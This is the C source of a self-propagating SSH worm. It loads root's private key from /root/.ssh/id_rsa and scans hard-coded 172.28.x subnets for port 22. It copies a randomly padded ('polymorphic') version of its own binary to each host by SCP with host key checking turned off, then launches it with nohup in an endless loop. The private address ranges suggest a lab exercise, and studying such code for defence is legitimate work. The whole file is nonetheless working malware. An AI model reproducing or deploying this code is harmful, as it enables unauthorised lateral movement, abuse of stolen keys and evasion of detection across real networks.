#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/stat.h>
#include <limits.h>
#include <stdint.h>

// Configuration
#define MAX_SUBNETS 4
#define MAX_IP_LEN 16
#define MAX_PATH_LEN 256
#define CHUNK_SIZE 4000
#define REMOTE_WORM_PATH "/tmp/worm2"
#define REMOTE_B64_PATH "/tmp/worm2.b64"
#define SSH_KEY_PATH "/root/.ssh/id_rsa"
#define SCAN_TIMEOUT 2
#define SSH_TIMEOUT 10

// Subnets to scan
const char* SUBNETS[MAX_SUBNETS] = {
    "172.28.1",
    "172.28.2",
    "172.28.3",
    "172.28.4"
};

// Base64 encoding table
static const char base64_table[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Base64 encode function
 * Returns dynamically allocated string (caller must free)
 */
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    *output_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = malloc(*output_length + 1);
    if (!encoded_data) return NULL;
    
    size_t i, j;
    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;
        
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        
        encoded_data[j++] = base64_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 0 * 6) & 0x3F];
    }
    
    // Add padding
    for (i = 0; i < (3 - input_length % 3) % 3; i++) {
        encoded_data[*output_length - 1 - i] = '=';
    }
    
    encoded_data[*output_length] = '\0';
    return encoded_data;
}

/**
 * Helper for memmem if not available or strictly standard C
 */
void *find_mem(const void *haystack, size_t haystacklen, const void *needle, size_t needlelen) {
    if (needlelen > haystacklen) return NULL;
    if (needlelen == 0) return (void *)haystack;
    
    const char *h = haystack;
    for (size_t i = 0; i <= haystacklen - needlelen; i++) {
        if (memcmp(h + i, needle, needlelen) == 0) {
            return (void *)(h + i);
        }
    }
    return NULL;
}

/**
 * Polymorphic engine - adds random bytes to worm binary
 * Returns dynamically allocated modified content (caller must free)
 */
unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_t* new_len) {
    // Magic marker to identify end of original binary
    const char *marker = "DEADBEEF_WORM_END";
    size_t marker_len = strlen(marker);

    // Find marker - we need the LAST occurrence because the string literal
    // itself exists in the binary's data section.
    
    unsigned char *found = NULL;
    unsigned char *current = file_content;
    unsigned char *next_found = NULL;
    
    // Find the last occurrence of the marker
    while ((next_found = find_mem(current, total_read - (current - file_content), marker, marker_len))) {
        found = next_found;
        current = found + 1;
    }

    size_t original_len = total_read;
    
    if (found) {
        size_t offset = found - file_content;
        size_t remaining = total_read - offset;
        
        // Heuristic: If the marker is found very close to the end (e.g. within last 100 bytes),
        // it's likely the appended one.
        if (remaining < (marker_len + 100)) {
            original_len = offset;
        }
    }

    // Generate random bytes
    int random_bytes_count = 10 + (rand() % 41); // 10 to 50 bytes
    
    // Calculate new size
    *new_len = original_len + marker_len + random_bytes_count;
    
    // Allocate new buffer
    unsigned char* new_content = malloc(*new_len);
    if (!new_content) {
        return NULL;
    }
    
    // Copy original content
    memcpy(new_content, file_content, original_len);
    
    // Append marker
    memcpy(new_content + original_len, marker, marker_len);
    
    // Append random bytes
    for (int i = 0; i < random_bytes_count; i++) {
        new_content[original_len + marker_len + i] = rand() % 256;
    }
    
    return new_content;
}

/**
 * Get the path to the current executable
 * Returns dynamically allocated string (caller must free)
 */
char* get_executable_path(const char* argv0) {
    char* path = malloc(PATH_MAX);
    if (!path) return NULL;
    
    // Try /proc/self/exe first (Linux)
    ssize_t len = readlink("/proc/self/exe", path, PATH_MAX - 1);
    if (len != -1) {
        path[len] = '\0';
        return path;
    }
    
    // Fallback: use argv[0] if available
    if (argv0) {
        // If it's an absolute path, use it directly
        if (argv0[0] == '/') {
            return strdup(argv0);
        }
        // Otherwise, try to resolve it (simplified - just return as-is)
        return strdup(argv0);
    }
    
    free(path);
    return NULL;
}

/**
 * Read SSH private key from /root/.ssh/id_rsa
 * Returns dynamically allocated key content (caller must free), or NULL on error
 */
char* read_ssh_key() {
    FILE* f = fopen(SSH_KEY_PATH, "r");
    if (!f) {
        printf("[-] SSH key not found at %s\n", SSH_KEY_PATH);
        return NULL;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long key_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (key_size <= 0) {
        fclose(f);
        return NULL;
    }
    
    char* key_content = malloc(key_size + 1);
    if (!key_content) {
        fclose(f);
        return NULL;
    }
    
    size_t bytes_read = fread(key_content, 1, key_size, f);
    fclose(f);
    key_content[bytes_read] = '\0';
    
    printf("[+] SSH key loaded from %s (%zu bytes)\n", SSH_KEY_PATH, bytes_read);
    return key_content;
}

/**
 * Scan target IP for port 22 (SSH)
 * Returns 1 if port is open, 0 otherwise
 */
int scan_target(const char* ip) {
    printf("[*] Scanning %s for port 22 (SSH)...\n", ip);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("[-] Error creating socket: %s\n", strerror(errno));
        return 0;
    }
    
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(22);
    
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        printf("[-] Error converting IP address\n");
        close(sock);
        return 0;
    }
    
    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = SCAN_TIMEOUT;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    int result = connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    close(sock);
    
    return (result == 0) ? 1 : 0;
}

/**
 * Execute command via SSH
 * Returns 1 on success, 0 on failure
 */
int run_ssh_command(const char* ip, const char* command) {
    char ssh_cmd[4096];
    snprintf(ssh_cmd, sizeof(ssh_cmd),
        "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
        "-i %s root@%s '%s' 2>/dev/null",
        SSH_TIMEOUT, SSH_KEY_PATH, ip, command);
    
    int result = system(ssh_cmd);
    return (result == 0) ? 1 : 0;
}

/**
 * Transfer file via SCP
 * Returns 1 on success, 0 on failure
 */
int scp_transfer(const char* ip, const char* local_file, const char* remote_file) {
    char scp_cmd[4096];
    snprintf(scp_cmd, sizeof(scp_cmd),
        "scp -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
        "-i %s %s root@%s:%s 2>/dev/null",
        SSH_TIMEOUT, SSH_KEY_PATH, local_file, ip, remote_file);
    
    int result = system(scp_cmd);
    return (result == 0) ? 1 : 0;
}

/**
 * Infect target by uploading and executing this worm via SSH
 * Returns 1 on success, 0 on failure
 */
int infect_target(const char* ip, const char* argv0) {
    if (!scan_target(ip)) {
        return 0;
    }
    
    printf("[+] SSH Server found at %s!\n", ip);
    
    // Check if SSH key exists
    if (access(SSH_KEY_PATH, R_OK) != 0) {
        printf("[-] SSH key not accessible at %s\n", SSH_KEY_PATH);
        return 0;
    }
    
    printf("[*] Attempting infection on %s via SSH...\n", ip);
    
    // 1. Read own binary -> Self-replication
    char* exe_path = get_executable_path(argv0);
    if (!exe_path) {
        printf("[-] Could not determine executable path, trying /proc/self/exe\n");
        exe_path = strdup("/proc/self/exe");
    }
    
    FILE* f = fopen(exe_path, "rb");
    if (!f) {
        printf("[-] Error reading own binary: %s\n", strerror(errno));
        free(exe_path);
        return 0;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long file_size_long = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size_long < 0) {
        printf("[-] Error getting file size\n");
        fclose(f);
        free(exe_path);
        return 0;
    }
    
    size_t file_size = (size_t)file_size_long;
    
    // Read file
    unsigned char* worm_content = malloc(file_size);
    if (!worm_content) {
        fclose(f);
        free(exe_path);
        return 0;
    }
    
    size_t bytes_read = fread(worm_content, 1, file_size, f);
    fclose(f);
    free(exe_path);
    
    if (bytes_read != file_size) {
        printf("[-] Error reading binary: incomplete read\n");
        free(worm_content);
        return 0;
    }
    
    // Apply polymorphic mutation to create unique variant
    printf("[*] Applying polymorphic mutation...\n");
    size_t mutated_size;
    unsigned char* mutated_content = polimorfism(worm_content, file_size, &mutated_size);
    free(worm_content);
    
    if (!mutated_content) {
        printf("[-] Error applying polymorphic mutation\n");
        return 0;
    }
    
    printf("[*] Polymorphic mutation applied: %zu -> %zu bytes\n", file_size, mutated_size);
    
    // Write mutated content to temporary file
    const char* temp_worm = "/tmp/worm2_temp";
    FILE* temp_f = fopen(temp_worm, "wb");
    if (!temp_f) {
        printf("[-] Error creating temporary file\n");
        free(mutated_content);
        return 0;
    }
    
    fwrite(mutated_content, 1, mutated_size, temp_f);
    fclose(temp_f);
    free(mutated_content);
    
    // Make temp file executable
    chmod(temp_worm, 0755);
    
    // 2. Check if already infected
    char check_cmd[512];
    snprintf(check_cmd, sizeof(check_cmd), "test -f %s && echo 'EXISTS'", REMOTE_WORM_PATH);
    
    char result_file[256];
    snprintf(result_file, sizeof(result_file), "/tmp/check_%s.txt", ip);
    
    char check_full_cmd[1024];
    snprintf(check_full_cmd, sizeof(check_full_cmd),
        "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
        "-i %s root@%s '%s' > %s 2>/dev/null",
        SSH_TIMEOUT, SSH_KEY_PATH, ip, check_cmd, result_file);
    
    system(check_full_cmd);
    
    FILE* check_f = fopen(result_file, "r");
    if (check_f) {
        char check_result[64];
        if (fgets(check_result, sizeof(check_result), check_f)) {
            if (strstr(check_result, "EXISTS")) {
                printf("[*] Target %s already infected.\n", ip);
                fclose(check_f);
                unlink(result_file);
                unlink(temp_worm);
                return 1;
            }
        }
        fclose(check_f);
        unlink(result_file);
    }
    
    // 3. Transfer worm via SCP
    printf("[*] Transferring worm to %s via SCP...\n", ip);
    if (!scp_transfer(ip, temp_worm, REMOTE_WORM_PATH)) {
        printf("[-] Error transferring worm to %s\n", ip);
        unlink(temp_worm);
        return 0;
    }
    
    // Clean up local temp file
    //unlink(temp_worm);
    
    // 4. Make executable on remote
    printf("[*] Setting executable permissions on remote...\n");
    char chmod_cmd[512];
    snprintf(chmod_cmd, sizeof(chmod_cmd), "chmod +x %s", REMOTE_WORM_PATH);
    run_ssh_command(ip, chmod_cmd);
    
    // 5. Execute worm on remote
    printf("[+] Executing worm on %s...\n", ip);
    char exec_cmd[512];
    snprintf(exec_cmd, sizeof(exec_cmd), "nohup %s > /tmp/worm2.log 2>&1 &", REMOTE_WORM_PATH);
    run_ssh_command(ip, exec_cmd);
    
    printf("[+] Infection complete for %s\n", ip);
    return 1;
}

int main(int argc, char* argv[]) {
    (void)argc;  // Suppress unused parameter warning
    printf("=== C SSH Key-Based Worm ===\n");
    
    // Initialize random seed for polymorphic engine
    srand(time(NULL));
    
    // Delay to allow system to settle if just started
    sleep(2);
    
    // Check if SSH key exists
    char* ssh_key = read_ssh_key();
    if (!ssh_key) {
        printf("[-] No SSH key found. Waiting for key...\n");
        // In a real scenario, we might try to steal keys or wait
        // For now, we'll just continue and let individual infections fail
    } else {
        free(ssh_key);
    }
    
    // Infection loop
    while (1) {
        printf("\n[*] Starting infection round...\n");
        
        for (int i = 0; i < MAX_SUBNETS; i++) {
            // Try hosts .2 and .3
            for (int host = 2; host < 4; host++) {
                char ip[MAX_IP_LEN];
                snprintf(ip, sizeof(ip), "%s.%d", SUBNETS[i], host);
                
                infect_target(ip, argv[0]);
            }
        }
        
        printf("[*] Round complete. Sleeping 20 seconds...\n");
        sleep(20);
    }
    
    return 0;
}

